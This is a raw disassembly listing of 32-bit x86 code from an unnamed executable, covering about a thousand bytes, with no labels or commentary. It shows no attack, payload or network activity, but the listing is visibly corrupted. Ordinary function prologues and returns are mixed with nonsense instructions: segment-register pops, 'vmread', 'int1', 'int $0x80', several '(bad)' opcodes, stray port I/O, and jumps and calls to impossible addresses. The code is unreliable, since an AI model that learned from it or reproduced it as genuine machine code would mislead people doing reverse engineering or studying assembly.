  40ae05:	10 bb 64 00 00 29    	adc    %bh,0x29000064(%ebx)
  40ae0b:	25 ff 00 00 00       	and    $0xff,%eax
  40ae10:	99                   	cltd
  40ae11:	f7 fb                	idiv   %ebx
  40ae13:	04 30                	add    $0x30,%al
  40ae15:	bc 55 10 88 01       	mov    $0x1881055,%esp
  40ae1a:	41                   	inc    %ecx
  40ae1b:	eb 04                	jmp    0x40ae21
  40ae1d:	3c 09                	cmp    $0x9,%al
  40ae1f:	76 17                	jbe    0x40ae38
  40ae21:	8b 75 10             	mov    0x10(%ebp),%esi
  40ae24:	bb 0a da 00 00       	mov    $0xda0a,%ebx
  40ae29:	b2 c2                	mov    $0xc2,%dl
  40ae2b:	00 00                	add    %al,(%eax)
  40ae2d:	00 99 f7 5b 04 30    	add    %bl,0x30045bf7(%ecx)
  40ae33:	88 01                	mov    %al,(%ecx)
  40ae35:	41                   	inc    %ecx
  40ae36:	8a 9b fc 30 96 4a    	mov    0x4a9630fc(%ebx),%bl
  40ae3c:	41                   	inc    %ecx
  40ae3d:	c6 01 2e             	movb   $0x2e,(%ecx)
  40ae40:	41                   	inc    %ecx
  40ae41:	4f                   	dec    %edi
  40ae42:	75 c1                	jne    0x40ae05
  40ae44:	8b 6e 0c             	mov    0xc(%esi),%ebp
  40ae47:	17                   	pop    %ss
  40ae48:	5e                   	pop    %esi
  40ae49:	c6 83 28 00 5b 5d c3 	movb   $0xc3,0x5d5b0028(%ebx)
  40ae50:	55                   	push   %ebp
  40ae51:	8b f8                	mov    %eax,%edi
  40ae53:	a3 ec ac 53 56       	mov    %eax,0x5653acec
  40ae58:	8b 75 93             	mov    -0x6d(%ebp),%esi
  40ae5b:	57                   	push   %edi
  40ae5c:	83 3e 2d             	cmpl   $0x2d,(%esi)
  40ae5f:	77 3e                	ja     0x40ae9f
  40ae61:	c7 06 00 55 d4 00    	movl   $0xd45500,(%esi)
  40ae67:	5f                   	pop    %edi
  40ae68:	5e                   	pop    %esi
  40ae69:	71 c0                	jno    0x40ae2b
  40ae6b:	fb                   	sti
  40ae6c:	8b e5                	mov    %ebp,%esp
  40ae6e:	5d                   	pop    %ebp
  40ae6f:	c2 b0 00             	ret    $0xb0
  40ae72:	f2 60                	repnz pusha
  40ae74:	08 df                	or     %bl,%bh
  40ae76:	43                   	inc    %ebx
  40ae77:	bb f6 c4 02 74       	mov    $0x7402c4f6,%ebx
  40ae7c:	e7 8b                	out    %eax,$0x8b
  40ae7e:	43                   	inc    %ebx
  40ae7f:	0c 85                	or     $0x85,%al
  40ae81:	75 75                	jne    0x40aef8
  40ae83:	5e                   	pop    %esi
  40ae84:	8b a9 6a 14 50 33    	mov    0x3350146a(%ecx),%ebp
  40ae8a:	ff                   	ljmp   (bad)
  40ae8b:	e8 d0 9b ff ff       	call   0x404a60
  40ae90:	8b c8                	mov    %eax,%ecx
  40ae92:	89 38                	mov    %edi,(%eax)
  40ae94:	89 a4 04 89 78 08 89 	mov    %esp,-0x76f78777(%esp,%eax,1)
  40ae9b:	78 0c                	js     0x40aea9
  40ae9d:	57                   	push   %edi
  40ae9e:	57                   	push   %edi
  40ae9f:	57                   	push   %edi
  40aea0:	89 78 10             	mov    %edi,0x10(%eax)
  40aea3:	04 89                	add    $0x89,%al
  40aea5:	4b                   	dec    %ebx
  40aea6:	0c ff                	or     $0xff,%al
  40aea8:	15 a0 c0 40 00       	adc    $0x40c0a0,%eax
  40aead:	8b 53 0c             	mov    0xc(%ebx),%edx
  40aeb0:	89 78 10             	mov    %edi,0x10(%eax)
  40aeb3:	8b 43 0c             	mov    0xc(%ebx),%eax
  40aeb6:	ed                   	in     (%dx),%eax
  40aeb7:	48                   	dec    %eax
  40aeb8:	10 85 07 75 25 5f    	adc    %al,0x5f257507(%ebp)
  40aebe:	35 98 c0 bc 00       	xor    $0xbcc098,%eax
  40aec3:	ff d6                	call   *%esi
  40aec5:	85 c0                	test   %eax,%eax
  40aec7:	3b 09                	cmp    (%ecx),%ecx
  40aec9:	1b 47 5b             	sbb    0x5b(%edi),%eax
  40aecc:	28 05 5d 7a 0c 00    	sub    %al,0xc7a5d
  40aed2:	ff d6                	call   *%esi
  40aed4:	5f                   	pop    %edi
  40aed5:	1b 05 80 fc 0a 00    	sbb    0xafc80,%eax
  40aedb:	5b                   	pop    %ebx
  40aedc:	8b e5                	mov    %ebp,%esp
  40aede:	b3 c2                	mov    $0xc2,%bl
  40aee0:	0c 49                	or     $0x49,%al
  40aee2:	8b 43 30             	mov    0x30(%ebx),%eax
  40aee5:	83 cf ff             	or     $0xffffffff,%edi
  40aee8:	3b c7                	cmp    %edi,%eax
  40aeea:	8b 45 b1             	mov    -0x4f(%ebp),%eax
  40aeed:	74 28                	je     0x40af17
  40aeef:	8a 4b 30             	mov    0x30(%ebx),%cl
  40aef2:	88 08                	mov    %cl,(%eax)
  40aef4:	8b 5b 40             	mov    0x40(%ebx),%ebx
  40aef7:	4a                   	dec    %edx
  40aef8:	89 16                	mov    %edx,(%esi)
  40aefa:	89 7b 30             	mov    %edi,0x30(%ebx)
  40aefd:	4b                   	dec    %ebx
  40aefe:	0e                   	push   %cs
  40aeff:	89 45 0c             	mov    %eax,0xc(%ebp)
  40af02:	85 c9                	test   %ecx,%ecx
  40af04:	75 11                	jne    0x40af17
  40af06:	c7 06 01 00 3c 00    	movl   $0x3c0001,(%esi)
  40af0c:	5f                   	pop    %edi
  40af0d:	65 33 c0             	gs xor %eax,%eax
  40af10:	5b                   	pop    %ebx
  40af11:	8b e5                	mov    %ebp,%esp
  40af13:	5d                   	pop    %ebp
  40af14:	c2 0c 01             	ret    $0x10c
  40af17:	8a 9b 2c 84 c9 0f    	mov    0xfc9842c(%ebx),%bl
  40af1d:	84 1d 01 00 00 8b    	test   %bl,0x8b000001
  40af23:	80 58 8b 3e          	sbbb   $0x3e,-0x75(%eax)
  40af27:	1d 89 45 fc 89       	sbb    $0x89fc4589,%eax
  40af2c:	7d d4                	jge    0x40af02
  40af2e:	e8 9d f3 ff ff       	call   0x40a2d0
  40af33:	83 72 48 85          	xorl   $0xffffff85,0x48(%edx)
  40af37:	45                   	inc    %ebp
  40af38:	2d 53 e8 91 03       	sub    $0x391e853,%eax
  40af3d:	00 00                	add    %al,(%eax)
  40af3f:	33 c9                	xor    %ecx,%ecx
  40af41:	89 45 08             	mov    %eax,0x8(%ebp)
  40af44:	3b c1                	cmp    %ecx,%eax
  40af46:	74 4c                	je     0x40af94
  40af48:	8b 43 58             	mov    0x58(%ebx),%eax
  40af4b:	50                   	push   %eax
  40af4c:	e8 ef f3 ff ff       	call   0x40a340
  40af51:	8b 45 f2             	mov    -0xe(%ebp),%eax
  40af54:	86 0f                	xchg   %cl,(%edi)
  40af56:	c3                   	ret
  40af57:	8b e5                	mov    %ebp,%esp
  40af59:	5d                   	pop    %ebp
  40af5a:	c2 0c 00             	ret    $0xc
  40af5d:	89 4c 3c 89          	mov    %ecx,-0x77(%esp,%edi,1)
  40af61:	4b                   	dec    %ebx
  40af62:	48                   	dec    %eax
  40af63:	89 52 44             	mov    %edx,0x44(%edx)
  40af66:	c7 45 08 00 00 00 00 	movl   $0x0,0x8(%ebp)
  40af6d:	eb 03                	jmp    0x40af72
  40af6f:	8b 7d 20             	mov    0x20(%ebp),%edi
  40af72:	85 ff                	test   %edi,%edi
  40af74:	0f 78 73 a5          	vmread %esi,-0x5b(%ebx)
  40af78:	29 18                	sub    %ebx,(%eax)
  40af7a:	8b 4b 3c             	mov    0x3c(%ebx),%ecx
  40af7d:	8b 86 32 3b 7c 72    	mov    0x727c3b32(%esi),%eax
  40af83:	37                   	aaa
  40af84:	f1                   	int1
  40af85:	43                   	inc    %ebx
  40af86:	40                   	inc    %eax
  40af87:	8b 4b b4             	mov    -0x4c(%ebx),%ecx
  40af8a:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40af8d:	52                   	push   %edx
  40af8e:	50                   	push   %eax
  40af8f:	99                   	cltd
  40af90:	ef                   	out    %eax,(%dx)
  40af91:	e8 ea 00 00 00       	call   0x40b080
  40af96:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40af99:	33 65 69             	xor    0x69(%ebp),%esp
  40af9c:	c4 10                	les    (%eax),%edx
  40af9e:	3b e7                	cmp    %edi,%esp
  40afa0:	89 d1                	mov    %edx,%ecx
  40afa2:	3d 74 64 8b 1d       	cmp    $0x1d8b6474,%eax
  40afa7:	50                   	push   %eax
  40afa8:	8b 43 54             	mov    0x54(%ebx),%eax
  40afab:	03 f1                	add    %ecx,%esi
  40afad:	89 4b 44             	mov    %ecx,0x44(%ebx)
  40afb0:	cc                   	int3
  40afb1:	c2 89 7e             	ret    $0x7e89
  40afb4:	50                   	push   %eax
  40afb5:	89 43 54             	mov    %eax,0x54(%ebx)
  40afb8:	89 53 cb             	mov    %edx,-0x35(%ebx)
  40afbb:	f0 bf 3c 8b 43 b3    	lock mov $0xb3438b3c,%edi
  40afc1:	2b c2                	sub    %edx,%eax
  40afc3:	3b f8                	cmp    %eax,%edi
  40afc5:	77 02                	ja     0x40afc9
  40afc7:	8b c7                	mov    %edi,%eax
  40afc9:	8b 3c 38             	mov    (%eax,%edi,1),%edi
  40afcc:	a9 7d fc 8b c8       	test   $0xc88bfc7d,%eax
  40afd1:	03 92 8b d1 2b e9    	add    -0x16d42e75(%edx),%edx
  40afd7:	02 f3                	add    %bl,%dh
  40afd9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40afda:	61                   	popa
  40afdb:	ca 8b 55             	lret   $0x558b
  40afde:	fc                   	cld
  40afdf:	83 c4 0f             	add    $0xf,%esp
  40afe2:	af                   	scas   %es:(%edi),%eax
  40afe3:	d0 f3                	shl    $1,%bl
  40afe5:	e3 8b                	jecxz  0x40af72
  40afe7:	73 3c                	jae    0x40b025
  40afe9:	8b fb                	mov    %ebx,%edi
  40afeb:	39 03                	cmp    %eax,(%ebx)
  40afed:	f0 2b c8             	lock sub %eax,%ecx
  40aff0:	8b 45 33             	mov    0x33(%ebp),%eax
  40aff3:	a9 73 db 31 75       	test   $0x7531db73,%eax
  40aff8:	10 89 55 fc 85 6f    	adc    %cl,0x6f85fc55(%ecx)
  40affe:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40b001:	1a 84 0b ff ff 17 eb 	sbb    -0x14e80001(%ebx,%ecx,1),%al
  40b008:	0e                   	push   %cs
  40b009:	3d 7e 11 01 00       	cmp    $0x1117e,%eax
  40b00e:	75 07                	jne    0x40b017
  40b010:	c7                   	(bad)
  40b011:	2b 28                	sub    (%eax),%ebp
  40b013:	01 00                	add    %eax,(%eax)
  40b015:	00 00                	add    %al,(%eax)
  40b017:	44                   	inc    %esp
  40b018:	45                   	inc    %ebp
  40b019:	fc                   	cld
  40b01a:	8b 4d ca             	mov    -0x36(%ebp),%ecx
  40b01d:	2b 6e d0             	sub    -0x30(%esi),%ebp
  40b020:	06                   	push   %es
  40b021:	74 07                	je     0x40b02a
  40b023:	c7                   	(bad)
  40b024:	0b 08                	or     (%eax),%ecx
  40b026:	00 71 00             	add    %dh,0x0(%ecx)
  40b029:	00 8b 43 94 52 e8    	add    %cl,-0x17ad6bbd(%ebx)
  40b02f:	0d 70 ff ff 8b       	or     $0x8bffff70,%eax
  40b034:	45                   	inc    %ebp
  40b035:	08 5f 5e             	or     %bl,0x5e(%edi)
  40b038:	5b                   	pop    %ebx
  40b039:	8b e5                	mov    %ebp,%esp
  40b03b:	5d                   	pop    %ebp
  40b03c:	d5 0c                	aad    $0xc
  40b03e:	00 8b 16 8d 50 0c    	add    %cl,0xc508d16(%ebx)
  40b044:	51                   	push   %ecx
  40b045:	f5                   	cmc
  40b046:	3d 53 e8 33 00       	cmp    $0x33e853,%eax
  40b04b:	00 00                	add    %al,(%eax)
  40b04d:	83 3c 10 3d          	cmpl   $0x3d,(%eax,%edx,1)
  40b051:	7e 11                	jle    0x40b064
  40b053:	01 00                	add    %eax,(%eax)
  40b055:	89 45 08             	mov    %eax,0x8(%ebp)
  40b058:	75 b4                	jne    0x40b00e
  40b05a:	af                   	scas   %es:(%edi),%eax
  40b05b:	43                   	inc    %ebx
  40b05c:	28 01                	sub    %al,(%ecx)
  40b05e:	58                   	pop    %eax
  40b05f:	00 0e                	add    %cl,(%esi)
  40b061:	dc 45 59             	faddl  0x59(%ebp)
  40b064:	5f                   	pop    %edi
  40b065:	89 06                	mov    %eax,(%esi)
  40b067:	c2 45 08             	ret    $0x845
  40b06a:	55                   	push   %ebp
  40b06b:	48                   	dec    %eax
  40b06c:	d5 e5                	aad    $0xe5
  40b06e:	5d                   	pop    %ebp
  40b06f:	c2 0c f4             	ret    $0xf40c
  40b072:	56                   	push   %esi
  40b073:	90                   	nop
  40b074:	cf                   	iret
  40b075:	90                   	nop
  40b076:	90                   	nop
  40b077:	90                   	nop
  40b078:	d2 e9                	shr    %cl,%cl
  40b07a:	90                   	nop
  40b07b:	90                   	nop
  40b07c:	90                   	nop
  40b07d:	17                   	pop    %ss
  40b07e:	90                   	nop
  40b07f:	90                   	nop
  40b080:	55                   	push   %ebp
  40b081:	5f                   	pop    %edi
  40b082:	ec                   	in     (%dx),%al
  40b083:	56                   	push   %esi
  40b084:	e3 3d                	jecxz  0x40b0c3
  40b086:	08 57 8b             	or     %dl,-0x75(%edi)
  40b089:	7d f1                	jge    0x40b07c
  40b08b:	8b 46 10             	mov    0x10(%esi),%eax
  40b08e:	8b 4e 16             	mov    0x16(%esi),%ecx
  40b091:	55                   	push   %ebp
  40b092:	f8                   	clc
  40b093:	91                   	xchg   %eax,%ecx
  40b094:	45                   	inc    %ebp
  40b095:	10 b0 d0 00 00 85    	adc    %dh,-0x7affff30(%eax)
  40b09b:	71 8a                	jno    0x40b027
  40b09d:	46                   	inc    %esi
  40b09e:	08 84 c0 74 10 8b 56 	or     %al,0x568b1074(%eax,%eax,8)
  40b0a5:	04 2a                	add    $0x2a,%al
  40b0a7:	4d                   	dec    %ebp
  40b0a8:	08 54 00 51          	or     %dl,0x51(%eax,%eax,1)
  40b0ac:	78 00                	js     0x40b0ae
  40b0ae:	6a 00                	push   $0x0
  40b0b0:	6a 8e                	push   $0xffffff8e
  40b0b2:	52                   	push   %edx
  40b0b3:	ff 15 0c 75 40 00    	call   *0x40750c
  40b0b9:	ee                   	out    %al,(%dx)
  40b0ba:	c0 75 35 8b          	shlb   $0x8b,0x35(%ebp)
  40b0be:	35 98 c0 40 00       	xor    $0x40c098,%eax
  40b0c3:	c7 42 85 c0 75 5a 8b 	movl   $0x8b5a75c0,-0x7b(%edx)
  40b0ca:	4d                   	dec    %ebp
  40b0cb:	14 5f                	adc    $0x5f,%al
  40b0cd:	72 89                	jb     0x40b058
  40b0cf:	01 5d c3             	add    %ebx,-0x3d(%ebp)
  40b0d2:	c1 d6 05             	rcl    $0x5,%esi
  40b0d5:	80 fc 0a             	cmp    $0xa,%ah
  40b0d8:	00 07                	add    %al,(%edi)
  40b0da:	0a fc                	or     %ah,%bh
  40b0dc:	0a 00                	or     (%eax),%al
  40b0de:	75 05                	jne    0x40b0e5
  40b0e0:	b8 7e 11 01 00       	mov    $0x1117e,%eax
  40b0e5:	8b 7c 14 5f          	mov    0x5f(%esp,%edx,1),%edi
  40b0e9:	cc                   	int3
  40b0ea:	87 01                	xchg   %eax,(%ecx)
  40b0ec:	00 00                	add    %al,(%eax)
  40b0ee:	00 00                	add    %al,(%eax)
  40b0f0:	5d                   	pop    %ebp
  40b0f1:	c3                   	ret
  40b0f2:	8b 45 08             	mov    0x8(%ebp),%eax
  40b0f5:	85 c0                	test   %eax,%eax
  40b0f7:	75 7a                	jne    0x40b173
  40b0f9:	8b 80 14 5f 5e 89    	mov    -0x76a1a0ec(%eax),%eax
  40b0ff:	02 12                	add    (%edx),%dl
  40b101:	0b 19                	or     (%ecx),%ebx
  40b103:	00 00                	add    %al,(%eax)
  40b105:	5d                   	pop    %ebp
  40b106:	c3                   	ret
  40b107:	3b d3                	cmp    %ebx,%edx
  40b109:	76 02                	jbe    0x40b10d
  40b10b:	8b f8                	mov    %eax,%edi
  40b10d:	8b 46 0c             	mov    0xc(%esi),%eax
  40b110:	f5                   	cmc
  40b111:	c0 74 23 8a 4e       	shlb   $0x4e,-0x76(%ebx,%eiz,1)
  40b116:	9c                   	pushf
  40b117:	84 c9                	test   %cl,%cl
  40b119:	75 1c                	jne    0x40b137
  40b11b:	8b 3c 1b             	mov    (%ebx,%ebx,1),%edi
  40b11e:	89 48 46             	mov    %ecx,0x46(%eax)
  40b121:	ba 46 a4 8b 56       	mov    $0x568ba446,%edx
  40b126:	54                   	push   %esp
  40b127:	b9 20 00 00 00       	mov    $0x20,%ecx
  40b12c:	73 df                	jae    0x40b10d
  40b12e:	11 00                	adc    %eax,(%eax)
  40b130:	00 8b 56 7f 89 42    	add    %cl,0x42897f56(%ebx)
  40b136:	0c a9                	or     $0xa9,%al
  40b138:	3d 0c 8b 55 0c       	cmp    $0xc558b0c,%eax
  40b13d:	53                   	push   %ebx
  40b13e:	8d 4d 10             	lea    0x10(%ebp),%ecx
  40b141:	50                   	push   %eax
  40b142:	8b bd 04 51 57 52    	mov    0x52575104(%ebp),%edi
  40b148:	50                   	push   %eax
  40b149:	ff 15 6f c0 40 ec    	call   *0xec40c06f
  40b14f:	85 c0                	test   %eax,%eax
  40b151:	74 07                	je     0x40b15a
  40b153:	33 c0                	xor    %eax,%eax
  40b155:	e9 2b 01 00 9f       	jmp    0x9f40b285
  40b15a:	8b 3d 98 c0 40 6d    	mov    0x6d40c098,%edi
  40b160:	ff d7                	call   *%edi
  40b162:	85 c0                	test   %eax,%eax
  40b164:	0f                   	pmovmskb (bad),%ebx
  40b165:	d7                   	xlat   %ds:(%ebx)
  40b166:	1b 01                	sbb    (%ecx),%eax
  40b168:	00 00                	add    %al,(%eax)
  40b16a:	5c                   	pop    %esp
  40b16b:	d7                   	xlat   %ds:(%ebx)
  40b16c:	cd 80                	int    $0x80
  40b16e:	94                   	xchg   %eax,%esp
  40b16f:	0a 00                	or     (%eax),%al
  40b171:	c3                   	ret
  40b172:	65 00 11             	add    %dl,%gs:(%ecx)
  40b175:	00 0f                	add    %cl,(%edi)
  40b177:	85 d3                	test   %edx,%ebx
  40b179:	dd 2d 00 8b 1d 9c    	(bad) 0x9c1d8b00
  40b17f:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  40b183:	ce                   	into
  40b184:	5a                   	pop    %edx
  40b185:	ab                   	stos   %eax,%es:(%edi)
  40b186:	46                   	inc    %esi
  40b187:	10 9c c9 7c 5b 38 04 	adc    %bl,0x4385b7c(%ecx,%ecx,8)
  40b18e:	85 c0                	test   %eax,%eax
  40b190:	76 c5                	jbe    0x40b157
  40b192:	6a 00                	push   $0x0
  40b194:	68 e8 03 00 00       	push   $0x3e8
  40b199:	51                   	push   %ecx
  40b19a:	50                   	push   %eax
  40b19b:	e8 f0 03 84 13       	call   0x13c4b590
  40b1a0:	eb 0d                	jmp    0x40b1af
  40b1a2:	23 c1                	and    %ecx,%eax
  40b1a4:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b1a7:	75 04                	jne    0x40b1ad
  40b1a9:	0b a0 eb 02 33 c0    	or     -0x3fccfd15(%eax),%esp
  40b1af:	8b 1f                	mov    (%edi),%ebx
  40b1b1:	0c 50                	or     $0x50,%al
  40b1b3:	8b 51 10             	mov    0x10(%ecx),%edx
  40b1b6:	51                   	push   %ecx
  40b1b7:	ff d3                	call   *%ebx
  40b1b9:	8b f8                	mov    %eax,%edi
  40b1bb:	81 c3 d2 fc 18 b9    	add    $0xb918fcd2,%ebx
  40b1c1:	fc                   	cld
  40b1c2:	bf 85 ff 74 9b       	mov    $0x9b74ff85,%edi
  40b1c7:	a1 24 3f 41 00       	mov    0x413f24,%eax
  40b1cc:	8b 5e 04             	mov    0x4(%esi),%ebx
  40b1cf:	85 c0                	test   %eax,%eax
  40b1d1:	75 18                	jne    0x40b1eb
  40b1d3:	50                   	push   %eax
  40b1d4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1d5:	ec                   	in     (%dx),%al
  40b1d6:	00 41 00             	add    %al,0x0(%ecx)
  40b1d9:	69 e8 61 f7 ff ff    	imul   $0xfffff761,%eax,%ebp
  40b1df:	83 c4 0c             	add    $0xc,%esp
  40b1e2:	a3 60 09 41 00       	mov    %eax,0x410960
  40b1e7:	85 c0                	test   %eax,%eax
  40b1e9:	74 05                	je     0x40b1f0
  40b1eb:	53                   	push   %ebx
  40b1ec:	ec                   	in     (%dx),%al
  40b1ed:	d0 eb                	shr    $1,%bl
  40b1ef:	08 6a 01             	or     %ch,0x1(%edx)
  40b1f2:	29 15 4c c0 40 00    	sub    %edx,0x40c04c
  40b1f8:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40b1fb:	8b 56 04             	mov    0x4(%esi),%edx
  40b1fe:	8d                   	lea    (bad),%ebp
  40b1ff:	e8 10 65 ce 50       	call   0x510f1714
  40b204:	58                   	pop    %eax
  40b205:	52                   	push   %edx
  40b206:	4a                   	dec    %edx
  40b207:	15 b4 c0 c4 b5       	adc    $0xb5c4c0b4,%eax
  40b20c:	85 c0                	test   %eax,%eax
  40b20e:	6a 04                	push   $0x4
  40b210:	33 c0                	xor    %eax,%eax
  40b212:	eb 02                	jmp    0x40b216
  40b214:	8b 1d 98 c0 40 00    	mov    0x40c098,%ebx
  40b21a:	ff d3                	call   *%ebx
  40b21c:	85 c0                	test   %eax,%eax
  40b21e:	74 65                	je     0x40b285
  40b220:	ff d3                	call   *%ebx
  40b222:	db 80 fc 0a c5 3d    	fildl  0x3dc50afc(%eax)
  40b228:	64 00 2e             	add    %ch,%fs:(%esi)
  40b22b:	9b                   	fwait
  40b22c:	e1 07                	loope  0x40b235
  40b22e:	3d 63 00 0b 00       	cmp    $0xb0063,%eax
  40b233:	75 b1                	jne    0x40b1e6
  40b235:	81 ff 02 01 00 00    	cmp    $0x102,%edi
  40b23b:	75 12                	jne    0x40b24f
  40b23d:	c9                   	leave
  40b23e:	4d                   	dec    %ebp
  40b23f:	14 8b                	adc    $0x8b,%al
  40b241:	2f                   	das
  40b242:	10 5b d2             	adc    %bl,-0x2e(%ebx)
  40b245:	b8 77 11 01 00       	mov    $0x11177,%eax
  40b24a:	9f                   	lahf
  40b24b:	11 5e 5d             	adc    %ebx,0x5d(%esi)
  40b24e:	c3                   	ret
  40b24f:	91                   	xchg   %eax,%ecx
  40b250:	ed                   	in     (%dx),%eax
  40b251:	ec                   	in     (%dx),%al
  40b252:	eb 00                	jmp    0x40b254
  40b254:	68 12 8b 4d 14       	push   $0x144d8b12
  40b259:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40b25c:	5b                   	pop    %ebx
  40b25d:	5f                   	pop    %edi
  40b25e:	b8 7e 11 01 00       	mov    $0x1117e,%eax
  40b263:	89 50 5e             	mov    %edx,0x5e(%eax)
  40b266:	ab                   	stos   %eax,%es:(%edi)
  40b267:	c3                   	ret
  40b268:	3d a6 fc 0a 00       	cmp    $0xafca6,%eax
  40b26d:	da 12                	ficoml (%edx)
  40b26f:	8b 4d 7a             	mov    0x7a(%ebp),%ecx
  40b272:	8b 55 10             	mov    0x10(%ebp),%edx
  40b275:	5b                   	pop    %ebx
  40b276:	07                   	pop    %es
  40b277:	b8 7e 11 01 e2       	mov    $0xe201117e,%eax
  40b27c:	89 cf                	mov    %ecx,%edi
  40b27e:	5e                   	pop    %esi
  40b27f:	e8 c3 b2 68 75       	call   0x75a96547
  40b284:	38 70 4d             	cmp    %dh,0x4d(%eax)
  40b287:	10 85 c9 75 61 29    	adc    %al,0x296175c9(%ebp)
  40b28d:	4d                   	dec    %ebp
  40b28e:	14 8b                	adc    $0x8b,%al
  40b290:	55                   	push   %ebp
  40b291:	10 5b ed             	adc    %bl,-0x13(%ebx)
  40b294:	b8 7e 11 01 00       	mov    $0x1117e,%eax
  40b299:	89 11                	mov    %edx,(%ecx)
  40b29b:	5e                   	pop    %esi
  40b29c:	5d                   	pop    %ebp
  40b29d:	c3                   	ret
  40b29e:	8b 56 0c             	mov    0xc(%esi),%edx
  40b2a1:	85 a5 b5 18 8a 56    	test   %esp,0x568a18b5(%ebp)
  40b2a7:	08 54 d2 75          	or     %dl,0x75(%edx,%edx,8)
  40b2ab:	11 8b 56 50 03 eb    	adc    %ecx,-0x14fcafaa(%ebx)
  40b2b1:	8b 4e 54             	mov    0x54(%esi),%ecx
  40b2b4:	83 d1 00             	adc    $0x0,%ecx
  40b2b7:	89 56 24             	mov    %edx,0x24(%esi)
  40b2ba:	07                   	pop    %es
  40b2bb:	4e                   	dec    %esi
  40b2bc:	54                   	push   %esp
  40b2bd:	8b 2a                	mov    (%edx),%ebp
  40b2bf:	14 8b                	adc    $0x8b,%al
  40b2c1:	55                   	push   %ebp
  40b2c2:	10 5b 3c             	adc    %bl,0x3c(%ebx)
  40b2c5:	89 11                	mov    %edx,(%ecx)
  40b2c7:	5e                   	pop    %esi
  40b2c8:	5d                   	pop    %ebp
  40b2c9:	c3                   	ret
  40b2ca:	90                   	nop
  40b2cb:	90                   	nop
  40b2cc:	90                   	nop
  40b2cd:	90                   	nop
  40b2ce:	90                   	nop
  40b2cf:	90                   	nop
  40b2d0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40b2d1:	bb ec 51 56 8b       	mov    $0x8b5651ec,%ebx
  40b2d6:	08 d1                	or     %dl,%cl
  40b2d8:	8a 46 2c             	mov    0x2c(%esi),%al
  40b2db:	84 d5                	test   %dl,%ch
  40b2dd:	0f 84 91 00 00 00    	je     0x40b374
  40b2e3:	d7                   	xlat   %ds:(%ebx)
  40b2e4:	4e                   	dec    %esi
  40b2e5:	5c                   	pop    %esp
  40b2e6:	33 c2                	xor    %edx,%eax
  40b2e8:	53                   	push   %ebx
  40b2e9:	83 f9 01             	cmp    $0x1,%ecx
  40b2ec:	57                   	push   %edi
  40b2ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b2f0:	89 00                	mov    %eax,(%eax)
  40b2f2:	08 0f                	or     %cl,(%edi)
  40b2f4:	85 9c 0a 00 00 8b 7e 	test   %ebx,0x7e8b0000(%edx,%ecx,1)
  40b2fb:	3c 3b                	cmp    $0x3b,%al
  40b2fd:	c5 0f                	lds    (%edi),%ecx
  40b2ff:	84 91 be 00 81 3a    	test   %dl,0x3a8100be(%ecx)
  40b305:	5e                   	pop    %esi
  40b306:	38 83 ff ff 76 05    	cmp    %al,0x576ffff(%ebx)
  40b30c:	83 c8 ff             	or     $0xffffffff,%eax
  40b30f:	eb 02                	jmp    0x40b313
  40b311:	8b c7                	mov    %edi,%eax
  40b313:	8b 15 04 8d 4d fc    	mov    0xfc4d8d04,%edx
  40b319:	6a e4                	push   $0xffffffe4
  40b31b:	51                   	push   %ecx
  40b31c:	50                   	push   %eax
  40b31d:	53                   	push   %ebx
  40b31e:	6b ff 15             	imul   $0x15,%edi,%edi
  40b321:	14 c0                	adc    $0xc0,%al
  40b323:	40                   	inc    %eax
  40b324:	40                   	inc    %eax
  40b325:	85 c0                	test   %eax,%eax
  40b327:	74 2f                	je     0x40b358
  40b329:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b32c:	cb                   	lret
  40b32d:	56                   	push   %esi
  40b32e:	50                   	push   %eax
  40b32f:	8b 4e 54             	mov    0x54(%esi),%ecx
  40b332:	03 d0                	add    %eax,%edx
  40b334:	83 d1 00             	adc    $0x0,%ecx
  40b337:	2b 61 03             	sub    0x3(%ecx),%esp
  40b33a:	d8 27                	fsubs  (%edi)
  40b33c:	56                   	push   %esi
  40b33d:	d6                   	salc
  40b33e:	85 ff                	test   %edi,%edi
  40b340:	89 4e 6b             	mov    %ecx,0x6b(%esi)
  40b343:	77 c2                	ja     0x40b307
  40b345:	0e                   	push   %cs
  40b346:	45                   	inc    %ebp
  40b347:	08 5f c7             	or     %bl,-0x39(%edi)
  40b34a:	0a 3c 00             	or     (%eax,%eax,1),%bh
  40b34d:	00 00                	add    %al,(%eax)
  40b34f:	00 46 5e             	add    %al,0x5e(%esi)
  40b352:	8b e5                	mov    %ebp,%esp
  40b354:	5d                   	pop    %ebp
  40b355:	c2 04 dc             	ret    $0xdc04
  40b358:	51                   	push   %ecx
  40b359:	3d 68 c0 40 00       	cmp    $0x40c068,%eax
  40b35e:	ff d7                	call   *%edi
  40b360:	85 c0                	test   %eax,%eax
  40b362:	ad                   	lods   %ds:(%esi),%eax
  40b363:	05 89 45 08 eb       	add    $0xeb084589,%eax
  40b368:	0a ff                	or     %bh,%bh
  40b36a:	d7                   	xlat   %ds:(%ebx)
  40b36b:	05 80 fc 0a 00       	add    $0xafc80,%eax
  40b370:	89 45 04             	mov    %eax,0x4(%ebp)
  40b373:	8b 45 64             	mov    0x64(%ebp),%eax
  40b376:	8b 7e 50             	mov    0x50(%esi),%edi
  40b379:	8b 03                	mov    (%ebx),%eax
  40b37b:	54                   	push   %esp
  40b37c:	03 d0                	add    %eax,%edx
  40b37e:	8b 45 9b             	mov    -0x65(%ebp),%eax
  40b381:	a9 56 50 83 d1       	test   $0xd1835056,%eax
  40b386:	00 85 c0 f7 4e 54    	add    %al,0x544ef7c0(%ebp)
  40b38c:	75 07                	jne    0x40b395
  40b38e:	c7 46 42 00 00 b9 00 	movl   $0xb90000,0x42(%esi)
  40b395:	8b 07                	mov    (%edi),%eax
  40b397:	89 3a                	mov    %edi,(%edx)
  40b399:	5b                   	pop    %ebx
  40b39a:	5e                   	pop    %esi
  40b39b:	e8 e5 c0 c2 04       	call   0x5037485
  40b3a0:	00 e3                	add    %ah,%bl
  40b3a2:	c0 48 8b e5          	rorb   $0xe5,-0x75(%eax)
  40b3a6:	5d                   	pop    %ebp
